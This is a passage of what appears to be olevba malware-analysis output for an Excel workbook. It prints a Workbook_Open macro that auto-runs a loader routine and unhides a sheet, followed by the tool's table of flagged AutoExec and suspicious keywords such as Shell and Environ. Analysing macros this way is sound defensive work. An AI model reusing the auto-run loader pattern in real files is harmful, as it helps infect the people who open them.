eam: '_VBA_PROJECT_CUR/VBA/ThisWorkbook' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Private Sub Workbook_Open() Call userAldiLoadr Sheet3.Visible = xlSheetVisible Sheet3.Copy End Sub <---snip---> +----------+--------------------+---------------------------------------------+ |Type |Keyword |Description | +----------+--------------------+---------------------------------------------+ |AutoExec |Workbook_Open |Runs when the Excel Workbook is opened | |AutoExec |TextBox1_Change |Runs when the file is opened and ActiveX | | | |objects trigger events | |Suspicious|Environ |May read system environment variables | |Suspicious|Open |May open a file | |Suspicious|Write |May write to a file (if combined with Open) | |Suspicious|Put |May write to a file (if combined with Open) | |Suspicious|Binary |May read or write a binary file (if combined | | | |with Open) | |Suspicious|Shell |May run an executable file or a system | | | |command | |Suspicious|vbNormalNoFocus |May run an executab'''
